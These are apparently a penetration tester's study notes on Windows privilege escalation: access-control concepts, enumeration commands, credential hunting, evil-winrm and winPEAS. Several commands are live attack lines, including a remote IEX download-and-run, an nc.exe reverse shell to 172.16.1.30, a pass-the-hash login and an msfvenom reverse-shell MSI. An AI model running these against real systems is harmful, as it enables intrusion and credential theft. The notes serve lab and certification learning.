---
tags: evil-winrm
---
## Windows Privileges and Access Control Mechanisms

### Security Identifier (SID)
A unique value assigned to each entity (or principal) that can be authenticated by Windows, e.g. users and groups

SID for local accounts and groups is generated by *Local Security Authority (LSA)*
SID for domain users and groups is generated by *Domain Controller (DC)*

SID cannot be changed

SID string format: `S-R-X-Y`
- `S`: A literal "S"
- `R`: stands for revision, is always set to "1"
- `X`: identifier authority (the authority that issues the SID). Usually set to "5" (*NT Authority*, used for local or domain users and groups)
- `Y`: sub authorities of the identifier authority. Every SID contains one or more. Consists of a domain identifier and a relative identifier (RID). 
	- Domain identifier: 
		- SID of the domain for domain users
		- SID of the local machine for local users
		- "32" for built-in principals
	- RID: determines principals such as users or groups, starts at 1000 for nearly all principals

E.g.: SID of a local user
`S-1-5-21-1336799502-1441772794-948155058-1001`
- RID: `1001`
	- RID starts at 1000 for nearly all principals, which implies that this is the second local user created on the system

Useful well-known SIDs:
```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

### Access Token

Assigned to a user after authentication, describes *security context* of user

Security context:
- SID of user
- SID of groups the user is a member of
- user and group privileges
- further info on scope of token

Primary token:
- assigned to an object (process or thread) when a user starts it
- specifies which permissions the object has when interacting with another object
- is a copy of the access token of the user

Impersonation token:
- can be assigned to a thread
- provides a different security context than the process that owns the thread

### Mandatory Integrity Control 
uses *integrity levels* to control access to securable objects

- When processes are started or objects are created, they receive the integrity level of the principal performing this operation.
- One exception is if an executable file has a low integrity level, the process’s integrity level will also be low. 
- A principal with a lower integrity level cannot write to an object with a higher level, even if the permissions would normally allow them to do so.

Four integrity levels (Windows Vista onwards):
- System: SYSTEM (kernel, ...)
- High: Elevated users
- Medium: Standard users
- Low: very restricted rights often used in sandboxed \[^privesc_win_sandbox] processes or for directories storing temporary data

How to display integrity level:
- Processes: *[Process Explorer](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer)*
- Current user: `whoami /groups`
- Files: *icacls*

### User Account Control
a Windows security feature that protects the operating system by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator

An Administrative user obtains two access tokens after logon:
- standard user token (*filtered admin token*): used to perform all non-privileged operations
- regular admin token: used when user wants to perform privileged operation. A UAC consent prompt needs to be confirmed before use.

## Situational Awareness

⭐ Information that we should **always** obtain:
- Username and hostname:
  `whoami`
- Group memberships of the current user:
  `whoami /groups`
  `whoami /priv` (look for e.g. `SeImpersonatePrivilege`)
- Existing users and groups:
  (PS) `Get-LocalUser` or (cmd) `net user`
  (PS) `Get-LocalGroup` or (cmd) `net localgroup`
	- Pay attention to non-standard groups and their descriptions
	- Important built-in groups: 
		- Administrators
		- Backup Operators (can backup and restore all files on a computer, even those files they don't have permissions for)
		- Remote Desktop Users (can access the system with RDP)
		- Remote Management Users (can access the system with WinRM)
  (PS) `Get-LocalGroupMember [group name]`
- Operating system, version and architecture:
  `systeminfo`
	- OS Name
	- OS Version
	- System Type (relevant when we want to run binary files on system)
- Network information (obtainable by current user):
	- all network interfaces
	  `ipconfig /all`
		- Physical Address
		- DHCP Enabled
		- IPv4 Address
		- Default Gateway
		- DNS Servers
	- routing table
	  `route print`
	- all active network connections
	  `netstat -ano`
		- `-a`: display all active TCP connections and TCP and UDP ports
		- `-n`: disable name resolution
		- `-o`: show PID for each connection
- Installed applications:
	- 32-bit:
	  (PS) `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	- 64-bit:
	  (PS) `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	- Note that listed applications may not be complete. Check 32-bit and 64-bit **Program Files** in **C:\\**
	- Pay attention to interesting applications like password managers, 7zip, web server solution stack packages (e.g. XAMPP)
- Running processes:
  (PS) `Get-Process`
	- Relate to output of `netstat -ano`
- List stored credentials:
	`cmdkey /list`
	- Run a command as the stored user:
		- run reverse shell (contents of the script is the reverse shell payload in [[PowerShell and Powercat]])
		  (cmd) `runas /user:ACCESS\Administrator /savecred "powershell -ep bypass"`
		  (cmd) `runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2/admin.ps1')"` 
		- copy and read file from Administrator directory	  (cmd) `runas /noprofile /savecred /user:Administrator "cmd.exe /C copy C:\Users\Administrator\Desktop\root.txt C:\Users\security\root.txt"`
		  (cmd) `runas /noprofile /savecred /user:Administrator "cmd.exe /C copy C:\Users\security\root.txt+C:\Users\security\test.txt C:\Users\security\flag.txt"`

## Hidden in Plain View

Search file:
E.g. (PS) `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
E.g. (PS) `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`

Cat:
`type [filepath]` or `cat [filepath]`

Useful files to look out for:
- application-specific files (refer to interesting found applications from above section)
	- E.g. password manager database files (.kdbx), XAMPP config files
- certain files in home directory of user (.txt, .pdf, .xls, .xlsx, .doc, .docx)
  `Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
- files in AppData directory of user (it is hidden directory and not searched by default)
	- E.g. `RDCMan.settings`

Run program as a different user:
`runas /user:backupadmin cmd`
- Need a GUI to use this! (In other words, need access to a user account with remote desktop privileges) Because it doesn't accept our input in commonly used shells (e.g. bind shell, WinRM)
Non-GUI (powershell):
```powershell
$secpasswd = ConvertTo-SecureString "N0cturn@l21" -AsPlainText -Force 

$mycreds = New-Object System.Management.Automation.PSCredential ("juggernaut.local\cmarko", $secpasswd) 

Start-Process -FilePath powershell.exe -argumentlist "C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe" -Credential $mycreds
```
Non-GUI tool: https://github.com/antonioCoco/RunasCs
- `import-module .\Invoke-RunasCs.ps1`
- `Invoke-RunasCs [username] [password] [command]`

Ways to access system as another user:
- WinRM or RDP: if the user is a member of the corresponding groups
- schedule a task to execute a program of our choice as this user: if the target user has *Log on as a batch job* access right
- PsExec from Sysinternals: if target user has an active session

## Information Goldmine PowerShell

PowerShell logging mechanisms:
- [PowerShell Transcription](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript?view=powershell-7.4)
	- "over the shoulder transcription"
	- info saved in transcript files (often saved in home directories of users, a central directory for all users of a machine, or a network share collecting the files from all configured machines)
- [PowerShell Script Block Logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2)
	- records commands and blocks of script code as events while executing
	- contains the original representation of encoded code or commands
	- Event Viewer -> Applications and Services Logs -> Microsoft -> Windows -> Powershell -> Operational

Check PowerShell history of user:
`Get-History`
- Cleared by `Clear-History`

Get PSReadline history file location:
`(Get-PSReadlineOption).HistorySavePath`
- not affected by `Clear-History`

### [evil-winrm](https://github.com/Hackplayers/evil-winrm)
- creating a PowerShell remoting session via WinRM in a bind shell can cause unexpected behaviour
- This tool is used to connect to client with WinRM from our Kali machine (the target has WinRM port 5985 open)
- various built-in functions for penetration testing such as pass the hash, in-memory loading, and file upload/download

Connect to client:
`evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`

Connect to client (using password hash):
`evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6`

### Prevention

Administrators can prevent PSReadline from recording commands by setting the `- HistorySaveStyle` option to `SaveNothing` with the `Set-PSReadlineOption` Cmdlet. Alternatively, they can clear the history file manually.

## Automated Enumeration

### [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- automated tool to enumerate Windows target machine
- note that automated tools may be blocked by AV
- Alternatives: [Seatbelt](https://github.com/GhostPack/Seatbelt), [JAWS](https://github.com/411Hall/JAWS)

Location of winPEAS executable on Kali: `/usr/share/peass/winpeas/winPEASx64.exe`

1. Transfer winPEAS executable file to target machine:
   `iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe`
2. Run winPEAS program: (it takes a while)
   `.\winPEAS.exe`

Information of note from the output:
- Basic System Information 
	- OS version (could be wrong)
- PS default transcripts history 
	- transcript file location (could fail to detect)
- Users
	- list of all users and groups
- Looking for possible password files in users homes (could miss)
- Check `AlwaysInstallElevated` permissions
	- Exploitation: https://juggernaut-sec.com/alwaysinstallelevated/
		1. Check the architecture of the Windows OS (x64 or what):
		   `cmd.exe /c 'systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"'`
		2. Craft exploit:
		   `msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi`
		3. Transfer the file to target machine and run it to get reverse shell

